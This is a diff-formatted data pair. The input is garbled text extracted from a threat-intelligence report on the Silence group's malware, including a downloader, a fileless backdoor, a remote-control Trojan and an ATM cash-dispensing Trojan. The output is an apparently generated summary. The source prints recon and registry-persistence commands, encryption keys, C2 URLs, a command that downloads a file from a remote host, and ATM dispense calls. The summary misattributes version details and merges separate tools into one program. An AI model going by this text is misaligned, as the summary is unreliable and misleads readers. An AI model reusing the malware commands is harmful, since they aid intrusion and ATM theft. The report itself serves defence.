@@ -1,0 +1,602 @@
+
+
+
+Sentence : CHANGES IN TOOLS
+The report titled Silence: Moving into the Darkside, which was released in 2018, provided
+a detailed analysis of the entire toolset used by the Silence group. This section describes the
+dynamics of changes in the toolset after May 2018: some programs have remained the same,
+while others have been modified to bypass security systems more successfully. In addition, new
+tools have appeared.
+New tools:
+
+
+ The Ivoke loader, written in PowerShell, is the first fileless module used by Silence.
+It is interesting to note that they started using fileless tools later than other groups.
+This confirms that Silence has spent their evolution “catching up”: they first studied the
+approaches of other groups, and then customised them.
+
+
+EDA is a PowerShell agent based on the Empire and dnscat2 projects. The program
+
+
+is designed to control compromised systems by performing tasks through the command shell
+and tunneling traffic using the DNS protocol. This program was first discovered in March
+2019.
+
+xfs-disp.exe is a Trojan for attacking ATMs, which was allegedly used in the attack on IT Bank.
+
+Changes:
+
+
+The execution logic of Silence.Downloader and Silence.Main, as well as the commands
+executed by bots, have changed.
+
+
+Encryption has been added to the Silence.Downloader loader.
+
+
+The communication protocol between the CnC server and Silence.Main has been changed.
+
+
+```
+ Link between Silence.Downloader and FlawedAmmyy
+```
+A comparative analysis of Silence.Downloader and the FlawedAmmyy loader revealed that these
+programs were developed by the same person.
+It is important to note, however, that a link between Silence and attacks using FlawedAmmyy
+has not been confirmed: the infrastructure and the techniques of the attacks in these cases
+differ greatly.
+The FlawedAmmyy.Downloader has been observed in attacks on different targets in various
+regions. Some researchers emphasise that the TA505 group also uses this tool to conduct their
+operations.
+The tools that have remained the same are ProxyBot, ProxyBot.NET, and Atmosphere.
+
+19
+Downloader aka TrueBot
+The main goal of Silence.Downloader is to receive an executable file and run it on an infected
+machine. The web address at which the executable file is located is sent by the CnC server
+following a manual command from the operator, which means it cannot be obtained from
+a sandbox.
+The first sample of Silence.Downloader was detected in August 2017
+(SHA1 2ee8ee6d8ca6e815d654bb96952861f3704e82e9). The new version of the loader
+(SHA1 974f24e8f87e6a9cce7c6873954ecab50ffa6f92) was discovered in Q3 2018.
+Its functionality was significantly modified in order to more effectively bypass sandboxes
+and network security solutions:
+
+
+Removed mutex creation;
+
+
+Changed the list of drive letters for generating bot ID;
+
+
+Changed the algorithm for generating the identifier of an infected machine;
+
+
+Added features for collecting and transferring data about an infected machine;
+
+
+Added data encryption. Communication with the CnC server is encrypted, but not
+completely. Information about the infected machine is transmitted in clear text;
+
+
+Changed the paths for saving files;
+
+
+Changed the algorithms for generating file names;
+
+
+Changed the URLs for sending requests;
+
+
+Changed the list of supported commands. The new version only supports downloading
+and running executable files.
+
+
+Like previous versions, Silence.Downloader contains a large number of function calls that
+do not affect the program’s control flow. The application starts operating with a delay of 2.5
+seconds. Following this, it attempts to open the %APPDATA%\temps.dat file.
+Should the file in question be absent in the file system, information about the infected machine
+will be collected. The necessary information is gathered by executing commands in the cmd.
+exe command line interpreter. The output is forwarded to a file located in the following path:
+%APPDATA%\temps.dat.
+A list of system information collected:
+
+
+List of running processes
+
+
+Information about current remote desktop sessions
+
+
+Information about network adapters (IP address, subnet mask, gateway address)
+
+
+Computer name
+
+
+Infected machine ID
+
+
+20
+An example of commands used to collect information of interest is presented below:
+cmd /C tasklist >> %APPDATA%\temps.dat
+cmd /C qwinsta >> %APPDATA%\temps.dat
+cmd /C ipconfig >> %APPDATA%\temps.dat
+cmd /C hostname >> %APPDATA%\temps.dat
+Machine ID is calculated based on the serial number of one of the disk partitions (the first
+partition that it will be able to receive): "C", "D", "E", "F", or "Z". If there are no partitions with the
+above-mentioned letters on the infected computer, the constant 0x9A449F is used as a serial
+number. To calculate the ID, the application adds the serial number to the integer constant
+0x862937.
+Collected information is transmitted using a POST request to the address 185.70.186[.]149/
+dns_check/logs/logpc.php. Data about the infected machine is transferred in plain text. The
+In the event that the file %AppData%\temps.dat is present in the file system, the application copies
+itself to the startup folder. This is performed by executing a command in the cmd.exe command line
+interpreter. The command text is encrypted using the PikeJaXyzeUawuma key (the decryption
+algorithm is BASE64 → URL → RC4 → URL) . After decrypting the data, the following command will
+be available:
+/C REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinNetwork Security"
+/t REG_SZ /d "%s" /f
+Ensuring persistence in the system depends on the availability of the process avp.exe. If this
+process is absent from the system, the application will copy itself (provided there is no file)
+to the path % PROGRAMDATA%\svconhost.exe. and delete the alternative data stream in the
+path %PROGRAMDATA%\svconhost.exe:Zone. Identifier. If the process in question is present,
+the application will add the current location to autostart.
+Once the information about the infected system has been collected or the attacker has ensured
+persistence in the system, the application switches to a standby mode, waiting for further
+commands. To do this, it creates a GET request, in which the following data is transferred: infected
+machine ID, operating system version and bitness. Once the required data is received, the following
+string will be generated:
+n=&o=&a=
+A description of the parameters passed is presented below:
+
+
+The botid parameter is the infected machine ID
+
+
+The OS_VERSION parameter has one of the following values:
+
+
+UNKN
+
+
+2000
+
+
+XP
+
+
+S2003
+
+
+VISTA
+
+
+S2008R2
+
+
+S2008
+
+
+WIN7
+
+
+WIN8
+
+
+WIN81
+
+
+WIN10
+
+
+The PROC_ARCH parameter takes one of the following values:
+
+64    - 32
+
+
+
+22
+The generated string is encrypted using the key FKh23yu7T*&^@# and sent to the address
+185.70.186[.]149/dns_check/dns.php?dns=. The data encryption algorithm
+is URL → RC4 → URL → BASE64.
+The program sends the above-mentioned request to the server with an interval of 2 minutes.
+In response, the server will send a command. The key used for decryption is FKh23yu7T*&^@# .
+Processing messages from the server begins only if the message is longer than 10 characters.
+If the decrypted string starts with "http://", the payload will be loaded from the server. The
+received content is saved to a file called %APPDATA%[0-9a-f]{8}.dates. The file name, which
+is generated randomly, is a four-byte number written in hexadecimal. The Windows API function
+CoCreateGUID() generates a unique 128-bit number.
+The output is written to the GUID structure. The application uses only a part of the fields in this
+structure. As a result, the number will be calculated using the following formula: GUID.Data1 *
+GUID.Data2 - GUID.Data3 + 0xCB6. A formal definition of the GUID structure is presented
+below:
+typedef struct _GUID {
+DWORD Data1;
+WORD Data2;
+WORD Data3;
+BYTE Data4[8];
+};
+The received data is encrypted using the jgsi23894uhnfjusiof key. After decryption, the data
+is written to the file %APPDATA%\ CHROME-[0-9a-f]{8}.exe. To generate four-byte numbers,
+the CoCreateGuid() function is used too.
+In this case the formula differs from the previous version and is as follows: GUID.Data1 *
+GUID.Data2 - GUID.Data3 + 0xD435. Once the data are decrypted and written to the file, the
+encrypted version of the file (%APPDATA%[0-9a-f]{8}.dates) will be deleted. If the decrypted file
+starts with “MZ”, the application will launch it.
+Ivoke
+The Ivoke backdoor is a completely fileless Trojan. Its main task is to collect information about the
+infected system and load the next stage upon command from the CnC server.
+On 21 May 2019, a malicious email campaign was launched. The emails purported
+to be from a bank customer and contained a request to block a bank card. The
+messages were used to deliver an encrypted 7z archive called Novikov.7z (SHA1
+e22d5170981b8150dd08eda9b7eca7f5317247af). The archive contains a shortcut named
+Statement_180619.docx.lnk
+(SHA1 4d0d5ecaea133dbcc603119a5271796bfe371036).
+The shortcut runs MSHTA.exe, which launches the cmd.exe command interpreter. The
+command interpreter launches powershell.exe, downloads a remote PowerShell script located
+23
+at http://193.109.69[.]5/gggm/upl/txtand executes it.
+The string 
+is used as a bot ID. Following this, every 25 seconds, the program sends POST requests to the
+CnC server to obtain the second stage:
+ping|
+Example: ping|6176011233
+If the server responds with the string doneyyyyyyyyaa, the process will be terminated, because
+the machine is not one which the attacker is interested in. Otherwise, the server will send
+a base64-encoded response, which will be decoded, saved and executed to the directory
+%TEMP%\< OS build number >.exe.
+MainModule aka Silence
+This program is designed to remotely control a compromised system and is capable
+of downloading and running files from remote network nodes, executing commands in the
+command shell, and uploading local files to the CnC server. The following versions of the program
+were compared:
+
+
+an intermediate version (SHA1 c59cb38bcada36d8c7a671642146ff39f1f49693), discovered
+in November 2018;
+
+
+the latest version (SHA1 1477b18e917c295df9b3c5624e91057999a3f2b6) used in the
+attacks in early 2019;
+
+
+earlier versions of Silence.MainModule 2017 (taken into account only in the comparative
+table at the end of the chapter).
+
+
+Description and functionality of the 2019 version
+Silence.MainModule is a typical remote control Trojan that provides access to the command
+shell CMD.EXE with the possibility of downloading files from remote nodes to a computer
+and uploading files from a computer to a remote server.
+Compared to the samples from 2017, the intermediate version had a new command added for
+sending files from a compromised system to the CnC server. At the end of 2018, the developers
+changed the method of command spelling: they stopped using Russian words typed in the English
+layout.
+Network communications are performed using unencrypted connections via HTTP and GET
+requests. The first request () is sent to the CnC server in the following format:
+http:///showthread.php?yz=1.
+Example of a request: "http://185.29.10[.]26/showthread.php?yz=1"
+25
+In response, the CnC server sends , which, according to the debug information in the
+file, is the identifier of the client.
+GET /showthread.php?yz=1 HTTP/1.1
+Accept: /
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
+Host: 185.29.10[.]26
+Connection: Keep-Alive
+HTTP/1.1 200 OK
+Content-Type: Tex/ascii
+Date: Thu, 29 Nov 2018 22:23:08 GMT
+Connection: keep-alive
+Transfer-Encoding: chunked
+1543530188357
+The path to the script and the names of the yz= and User-Agent parameters can change to make
+it difficult to detect communication using traffic analysis tools.
+Following this, the file sends a second request () to the CnC. This looks as follows:
+"http://cnc/showthread.php?yz=2&alphayz=", where  is the server’s
+response to .
+Пример:
+GET /showthread.php?yz=2&alphayz=1543530188357 HTTP/1.1
+Accept: /
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
+Host: 185.29.10[.]26
+Connection: Keep-Alive
+HTTP/1.1 200 OK
+Content-Type: Tex/ascii
+Date: Thu, 29 Nov 2018 22:23:08 GMT
+Connection: keep-alive
+Transfer-Encoding: chunked
+loikjhu
+26
+In response, CnC sends one of the supported commands. The tables below contain lists
+of connection types and CnC commands that the malware executes.
+Type of connection Description Example of client request to CnC
+Connect1 Bot registration http://185.29.10[.]26/showthread.php?yz=1
+Connect2 Command request http://185.29.10[.]26/showthread.
+php?yz=2&alphayz=1234567890
+Connect3 Sending command results http://185.29.10[.]26/showthread.
+php?yz=2&alphayz=1234567890&betayz=aaaaabbbbccc
+Command Type of command Description Example of use
+nviodgs reconnect Terminate the command interpreter
+session, clear all temporary files, connect
+to CnC "from scratch"
+nviodgs
+cbthds restart Terminate the command interpreter cbthds
+session and restart it
+loikjhu notasks No operation loikjhu
+ipsum upload Upload a specified file to CnC #ipsum c:\some_file.exe
+lorem wget Download a file from a remote server #lorem
+and save it in the current directory http://84.38.134[.]103/f.exe 1.exe
+power\n shell Launch the command interpreter power\n
+\n run Execute an arbitrary OS command using \nipconfig
+the command interpreter
+27
+Detailed description of the commands:
+
+The restart command restarts the command interpreter, for example if the current console
+
+is unresponsive.
+
+The shell command launches a new hidden instance of the OS command interpreter, which
+will be used to covertly launch commands on the infected machine (the last line in the table
+
+above).
+
+
+The wget command delivers files from remote servers to PCs. The actor can specify which
+file to download and what name to save it under. The files are saved in the folder from which
+the executable file of the backdoor was launched. In the new version of the file, the command
+will not start if a string of less than 72 characters has been passed to it.
+
+
+The wput command is used to send the contents of a specified local file to the CnC server.
+
+
+If none of the control commands are received from the CnC, the connection can
+be re-established right away or with a one- or ten-second delay, in a cycle.
+Captured data is encoded using the coding algorithm with the native alphabet,
+AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_FnT8fOu4GoS,gvR6HMQ2hyPX, and is then
+sent to the CnC server.
+Despite the fact that the coding algorithm uses random data generation, the resulting coded data
+can be decoded on the server by the attacker because:
+
+
+The random data generator has small entropy (it only generates digits from 0 to 3).
+
+
+The random data generator has been intentionally designed this way to ensure that random
+data could be excluded based on the formula (since the result of multiplication will always
+be divisible by 4, and the random numbers are always less than 4).
+
+
+Each character in the source data is coded into two symbols using two different arithmetic
+operations (formulas). This allows the source data to be decoded by solving a system of equations.
+Encryption of the command output is performed based on the following correspondence table:
+As shown in the table, each value from the P row uniquely corresponds to a value from the
+C row. The elements in the C row are four-digit strings. Taking into account that
+each character in the alphabet AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_
+FnT8fOu4GoS,gvR6HMQ2hyPX belongs only to one line from the C row, you can make
+a reversible transformation:
+P[index] = C[index][random % 4]
+Let’s consider an example: let's say you need to encrypt the character 7, hex("7") = 0x37. The
+program splits the number into 3 and 7. First, it encodes the character 7, choosing any character
+(let it be "V") from the string “dVw.”. After that, it encodes the character 3, now choosing
+an encoding character from the string "bZq0" (let it be "0"). As a result, the program has encoded
+the character "7" with the string "V0".
+28
+29
+Comparison with the 2018 version
+Based on the binary comparison of the two file versions using the BinDiff utility, the 68% of the
+new version consists of code used in the old version. The new version of the file contains 349
+new functions, only 56 of which have more than 50 instructions.
+This means that the new version is a recompiled old version. The changes are described in the
+table below.
+Feature Value for the Value for the intermediate Value for the new
+2017 version version version
+Application format An executable service file An executable service file A simple executable file
+named Default monitors named Default monitors
+Debug Data Section yes no no
+Availability of
+debug output
+OutptDebugStringA\W
+yes no no
+Encryption of settings and no yes yes
+key strings
+Types of commands htrjyytrn, htcnfhn, ytnpflfx, The same commands + #wput. nviodgs, cbthds, loikjhu, power,
+supported #wget, shell, run #lorem, #ipsum
+Parameters of the request index.php?xy=1 index.php?xy=1 showthread.php?yz=1
+Connect1
+Parameters of the request index.php?xy=2&axy=[x] index.php?xy=2&axy=[x] showthread.
+Connect2 php?yz=3&alphayz=[x]
+Parameters of the request index. index. showthread.
+Connect3 php?xy=2&axy=[x]&bxy=[y] php?xy=2&axy=[x]&bxy=[y] php?yz=2&alphayz=[x]&betayz=[y]
+Proxy support yes yes no
+Is the gxftcp.dat file used no Yes Yes
+User-Agent \r\n\r\n Microsoft Internet Explorer Mozilla/5.0 (compatible;
+MSIE 10.0; Windows NT 6.1;
+Trident/5.0)
+Encoding data from the Yes The code has been slightly
+bot to backend modified, but the algorithm has
+not changed
+No change
+Llibrary used for network Winhttp Winhttp Wininet
+communication
+30
+32
+The malicious program scans all running processes (except its own) for msxfs.dll and injects code
+into the process where the .dll file is detected.
+
+
+Processes are enumerated using the Process32FirstW and Process32NextW functions.
+
+
+Modules loaded into the processes are enumerated using the OpenProcess,
+
+
+EnumProcessModulesEx, and GetModuleFileNameExA functions.
+Once the msxfs.dll module has been detected in one of the processes, the application creates the
+mutex Global\[x][pid] to block a possible repeated injection into the same process.
+x is the number 1337 in hex (hard-coded); the unaffected bits of the number are filled with
+zeros.
+pid is the process identifier for the injection in hex; the unaffected bits of the number
+are filled with zeros;
+If the version of the dispenser service provider is 3, the program performs the following actions:
+
+
+Sends the RESET command to CDM by calling the WFSExecute function with the flag
+dwCommand == WFS_CMD_CDM_DISPENSE
+
+
+Receives data about ATM cash units.
+
+
+Receives the maximum number of banknotes that can be withdrawn in a single operation
+using the same method as in version 2 (described above).
+
+
+Receives the current status of the dispenser (whether it is connected and busy), the state
+of the safe door, the state of dispenser’s logical cash units, the state of the shutter, etc. using
+the same method as in version 2 (described above).
+
+
+Receives information about cassettes and banknotes in the same way as in version
+2 (described above).
+
+
+Cash is then withdrawn by calling the WFSExecute function with the flag dwCommand ==
+WFS_CMD_CDM_DISPENSE (dispensing banknotes from cassettes).
+
+
+If an error with the code -306 occurs, the WFSExecute function is called with the
+dwCommand == WFS_CMD_CDM_PRESENT flag to open the shutter and cause banknotes
+to be dispensed.
+
+
+The steps for collecting data about cassettes and dispensing cash are repeated four times
+in a cycle .
+
+
+Re-sends the RESET command to CDM.
+
+
+If the version of the dispenser service provider is 3 and the application has been started with the
+command line argument --exchange:
+
+CMD is set to RESET mode by calling the function WFSExecute with the flag
+dwCommand == WFS_CMD_CDM_START_EXCHANGE.
+
+Command description from the specification:
+WFS_CMD_CDM_START_EXCHANGE
+Description This command puts the CDM in an exchange state, i.e. a state in which cash units
+can be emptied, replenished, removed or replaced.
+
+CMD terminates RESET mode by calling the WFSExecute function with the flag
+
+dwCommand == WFS_CMD_CDM_END_EXCHANGE.
+WFS_CMD_CDM_END_EXCHANGE
+Description This command will end the exchange state. If any physical action took place as a
+result of the WFS_CMD_CDM_START_EXCHANGE command then this command will cause the cash units
+to be returned to their normal physical state. Any necessary device testing will also be
+initiated.
+The application can also use this command to update cash unit information in the form
+described in the documentation of the WFS_INF_CDM_CASH_UNIT_INFO command.
+It modifies the WFSCDMCUINFO structure (and the structure WFSCDMCASHUNIT embedded in it),
+which is passed as an argument when calling the function WFSExecute(WFS_CMD_CDM_END_EXCHANGE)
+36
+Output : 
+### Overview of the Malicious Program and Its Operations
+
+The described malicious program targets ATMs and aims to control their cash dispensing mechanisms. Here’s a detailed breakdown of its functionality, structure, and operations:
+
+#### 1. **Program Structure and Format**
+- **2017 Version:** An executable service file named "Default monitors."
+- **Intermediate Version:** Also an executable service file with the same name.
+- **New Version:** A simple executable file without a specific name.
+
+#### 2. **Debugging Information**
+- **2017 Version:** Contains debug data and uses `OutputDebugStringA\W` for debugging output.
+- **Intermediate and New Versions:** No debug data or debugging output functions.
+
+#### 3. **Encryption of Settings and Key Strings**
+- **2017 Version:** No encryption.
+- **Intermediate and New Versions:** Encryption is implemented.
+
+#### 4. **Supported Commands**
+- **2017 Version:**
+  - `htrjyytrn`, `htcnfhn`, `ytnpflfx`
+  - `#wget` for downloading files
+  - `shell` for launching a command interpreter
+  - `run` for executing OS commands
+- **Intermediate and New Versions:**
+  - `nviodgs` for reconnecting to CnC
+  - `cbthds` for restarting the command interpreter
+  - `loikjhu` for no operation
+  - `power\n shell` for launching a hidden command interpreter
+  - `#lorem` for downloading files with additional checks
+  - `#ipsum` for uploading files
+
+#### 5. **Request Parameters**
+- **Connect1:**
+  - 2017 Version: `index.php?xy=1`
+  - Intermediate and New Versions: `showthread.php?yz=1`
+- **Connect2:**
+  - 2017 Version: `index.php?xy=2&axy=[x]`
+  - Intermediate and New Versions: `showthread.php?yz=3&alphayz=[x]`
+- **Connect3:**
+  - 2017 Version: `index.php?xy=2&axy=[x]&bxy=[y]`
+  - Intermediate and New Versions: `showthread.php?yz=2&alphayz=[x]&betayz=[y]`
+
+#### 6. **Proxy Support**
+- **2017 Version:** Supports proxies.
+- **Intermediate and New Versions:** No proxy support.
+
+#### 7. **Use of gxftcp.dat File**
+- **2017 Version:** Does not use `gxftcp.dat`.
+- **Intermediate and New Versions:** Uses `gxftcp.dat`.
+
+#### 8. **User-Agent String**
+- **2017 Version:**
+  - `\r\n\r\n Microsoft Internet Explorer`
+- **Intermediate and New Versions:**
+  - `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)`
+
+#### 9. **Encoding Data from Bot to Backend**
+- **2017 Version:** Uses encoding.
+- **Intermediate and New Versions:** The algorithm remains the same but with slight modifications.
+
+#### 10. **Library for Network Communication**
+- **2017 Version:** `Winhttp`
+- **Intermediate and New Versions:** `Wininet`
+
+### Detailed Operations
+
+#### 1. **Process Scanning and Code Injection**
+- **Scans all running processes (except its own) for `msxfs.dll`**.
+- **Uses the following functions to enumerate processes and modules:**
+  - `Process32FirstW`, `Process32NextW`
+  - `OpenProcess`, `EnumProcessModulesEx`, `GetModuleFileNameExA`
+- **Creates a mutex `Global\[x][pid]` to prevent repeated injection into the same process.**
+  - `x` is the number 1337 in hex.
+  - `pid` is the process identifier in hex.
+
+#### 2. **Dispenser Service Provider Version 3 Operations**
+- **Sends a RESET command to CDM using `WFSExecute` with `dwCommand == WFS_CMD_CDM_DISPENSE`.**
+- **Collects data about ATM cash units, maximum number of banknotes, and current status.**
+- **Withdraws cash by calling `WFSExecute` with `dwCommand == WFS_CMD_CDM_DISPENSE`.**
+- **Handles errors and re-sends the RESET command if necessary.**
+
+#### 3. **Exchange Mode Operations**
+- **If started with the `--exchange` argument:**
+  - Sets CMD to RESET mode using `WFSExecute` with `dwCommand == WFS_CMD_CDM_START_EXCHANGE`.
+  - Terminates RESET mode using `WFSExecute` with `dwCommand == WFS_CMD_CDM_END_EXCHANGE`.
+
+#### 4. **Data Encoding and Decoding**
+- **Uses a custom encoding algorithm with the alphabet:**
+  - `AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_FnT8fOu4GoS,gvR6HMQ2hyPX`
+- **Each character in the source data is encoded into two symbols using arithmetic operations.**
+- **The encoding and decoding processes are reversible based on a system of equations.**
+
+### Conclusion
+This malicious program is highly sophisticated, designed to target specific ATM systems by injecting code and controlling cash dispensing mechanisms. The evolution from the 2017 version to the new version shows improvements in encryption, command set, and operational robustness. Understanding its operations can help in developing better defense strategies against such threats.
